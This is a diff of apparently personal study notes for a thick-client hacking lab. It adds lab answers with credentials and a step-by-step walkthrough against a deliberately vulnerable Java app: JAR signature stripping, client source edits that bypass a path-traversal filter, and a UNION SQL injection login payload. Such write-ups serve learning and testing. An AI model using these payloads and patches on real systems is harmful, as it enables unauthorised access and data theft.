@@ -958,8 +958,186 @@ Thick client apps run locally (not in browser). Attack surface includes hardcode
 - x64dbg memory map auto-scrolls — click to select the row first, then right-click to dump
 - Batch file generates randomly named files each run — check `%TEMP%\2\` after each run
 
+### Lab Answers
+- Target: `10.129.228.115` (ACADEMY-ACA-PIVOTAPI) — RDP as `cybervaca:&aue%C)}6g-d{w`
+- Credentials found in dnSpy source: `svc_oracle:#oracle_s3rV1c3!2010`
+
+### Critical Gotchas (learned during lab)
+- Do NOT run PowerShell as Administrator — admin privileges bypass the Temp folder delete-permission block, so the batch file gets deleted before you can capture it
+- Apply the permission block to `Temp\2\` directly, not just `Temp` parent
+- If `monta.ps1` fails when the batch runs it, run it manually: `& C:\ProgramData\monta.ps1` from a Start menu PowerShell (not cmd)
+
+---
+
+## Section 22 — Exploiting Web Vulnerabilities in Thick-Client Applications
+
+### Overview
+Three-tier thick client apps are still vulnerable to web attacks (SQLi, path traversal) even though the client doesn't talk directly to the DB. This section uses a Java JAR client (`fatty-client.jar`) that connects to a server over a custom protocol.
+
+### Full Attack Chain
+1. Get files from FTP (anonymous access)
+2. Add `server.fatty.htb` to hosts file
+3. Extract JAR → edit `beans.xml` (port) → strip manifest hashes → repack → log in
+4. Path traversal to list server filesystem and download `fatty-server.jar`
+5. Decompile server JAR to understand SQL injection in login
+6. Modify client to bypass password hashing → use UNION injection to log in as admin
+7. Access ServerStatus features locked to user role
+
+### Step 1 — FTP Enumeration
+```
+ftp <target>
+# login: anonymous / (blank password)
+get fatty-client.jar
+get note.txt
+get note2.txt
+get note3.txt
+bye
+```
+
+Notes reveal:
+- Server moved from port 8000 → **1337**
+- App requires **Java 8**
+- Credentials: `qtc / clarabibi`
+
+### Step 2 — Hosts File
+Admin PowerShell:
+```powershell
+echo "10.129.228.115    server.fatty.htb" >> C:\Windows\System32\drivers\etc\hosts
+```
+
+### Step 3 — Patch the JAR (port fix + signature strip)
+
+**Extract:**
+```powershell
+mkdir fatty-client
+cp fatty-client.jar fatty-client\
+cd fatty-client
+jar xf fatty-client.jar
+```
+
+**Edit `beans.xml`** — change port from 8000 to 1337:
+```xml
+<constructor-arg index="1" value = "1337"/>
+```
+Also note the secret: `clarabibiclarabibiclarabibi`
+
+**Find which file has the port reference:**
+```powershell
+ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
+```
+
+**Strip the JAR signature** (running the patched JAR will fail with SHA-256 digest mismatch otherwise):
+- Open `META-INF\MANIFEST.MF` → delete all `Name:` and `SHA-256-Digest:` lines → leave only the 7-line header ending with a blank line:
+```
+Manifest-Version: 1.0
+Archiver-Version: Plexus Archiver
+Built-By: root
+Sealed: True
+Created-By: Apache Maven 3.3.9
+Build-Jdk: 1.8.0_232
+Main-Class: htb.fatty.client.run.Starter
+
+```
+- Delete `META-INF\1.RSA` and `META-INF\1.SF`
+
+**Repack:**
+```powershell
+cd fatty-client
+jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
+```
+
+Double-click `fatty-client-new.jar` → log in with `qtc / clarabibi` → **Login Successful!**
+
+### Step 4 — Path Traversal (get fatty-server.jar)
+
+The FileBrowser filters `/` — to bypass, decompile with JD-GUI, edit `ClientGuiTest.java`:
+```java
+// Change configs to ..
+ClientGuiTest.this.currentFolder = "..";
+response = ClientGuiTest.this.invoker.showFiles("..");
+```
+
+Recompile:
+```powershell
+javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
+```
+
+Rebuild JAR:
+```powershell
+mkdir raw
+cp fatty-client-new.jar raw\fatty-client-new-2.jar
+# Extract raw\fatty-client-new-2.jar in place (right-click → Extract Here)
+mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
+cd raw
+jar -cmf META-INF\MANIFEST.MF traverse.jar .
+```
+
+Log in → FileBrowser → Config → see `fatty-server.jar` listed.
+
+**Download `fatty-server.jar`** — modify `Invoker.java` `open()` method to write response bytes to Desktop:
+```java
+import java.io.FileOutputStream;
+// Inside open():
+String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
+FileOutputStream fos = new FileOutputStream(desktopPath);
+byte[] content = this.response.getContent();
+fos.write(content);
+fos.close();
+return "Successfully saved the file to " + desktopPath;
+```
+Rebuild JAR → FileBrowser → Config → type `fatty-server.jar` → Open → file lands on Desktop.
+
+### Step 5 — SQL Injection Analysis (from decompiled server)
+
+Decompile `fatty-server.jar` with JD-GUI. Key file: `htb/fatty/server/database/FattyDbSession.class`
+
+Vulnerable query (username unsanitized):
+```java
+rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
+```
+
+Password comparison — server compares `newUser.getPassword()` with `user.getPassword()`. The client hashes the password as:
+```
+sha256(username + password + "clarabibimakeseverythingsecure")
+```
+
+Simple `' or '1'='1` fails because the returned user's stored password hash won't match the injected credentials' hash.
+
+**UNION injection approach:** Inject a fake row where we control all fields including password:
+```
+abc' UNION SELECT 1,'abc','a@b.com','abc','admin
+```
+Server processes:
+```sql
+SELECT id,username,email,password,role FROM users WHERE username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
+```
+Returns fake admin user with password `abc`. If the client also sends `abc` as the password, comparison succeeds.
+
+### Step 6 — Bypass Password Hashing in Client
+
+Edit `htb/fatty/shared/resources/User.java` — replace `setPassword()` to send plaintext:
+```java
+public void setPassword(String password) {
+    this.password = password;
+}
+```
+
+Rebuild JAR → log in with:
+- **Username:** `abc' UNION SELECT 1,'abc','a@b.com','abc','admin`
+- **Password:** `abc`
+
+Result: logged in as admin role → ServerStatus → Uname / Users / Netstat / **Ipconfig** now accessible.
+
+### Key Gotchas
+- JAR signature validation: must strip ALL `Name:/SHA-256-Digest:` blocks from MANIFEST.MF AND delete `1.RSA` and `1.SF` — missing any one of these causes a digest mismatch crash
+- MANIFEST.MF must end with a trailing blank line or `jar` will error
+- Path traversal: server filters `/` in the GUI input — bypass requires source-level edit of the Java client, not just input manipulation
+- UNION injection fails if client still hashes the password — must patch `setPassword()` to submit plaintext
+- `javac -cp` must point to the JAR for class resolution; compiled `.class` files must overwrite the ones extracted from the JAR before repacking
+- Each JAR rebuild requires: compile → extract JAR to folder → overwrite `.class` files → repack with `jar -cmf`
+- Verify injection worked by checking logs via FileBrowser → `../logs/error-log.txt`
+
 ### Lab Status
 - Target: `10.129.228.115` (ACADEMY-ACA-PIVOTAPI) — RDP as `cybervaca:&aue%C)}6g-d{w`
-- Extracted `restart-service.exe` from oracle.txt via monta.ps1 — located at `C:\ProgramData\restart-service.exe`
-- **Stopped at:** x64dbg memory map dump step — MAP entry (Type=MAP, Size=3000, -RW--) identified but not yet dumped
-- **Resume:** Open x64dbg → load `C:\ProgramData\restart-service.exe` → Memory Map → find MAP/3000/-RW-- entry → click to select → right-click → Dump Memory to File → de4dot → dnSpy → find credentials
+- **Stopped at:** Step 3 — JAR extracted to `C:\Users\cybervaca\Desktop\fatty-client\`, hosts entry added
+- **Resume:** Edit `beans.xml` (port 8000→1337) → strip MANIFEST.MF → delete 1.RSA/1.SF → repack → log in → path traversal → get fatty-server.jar → SQLi as admin → Ipconfig
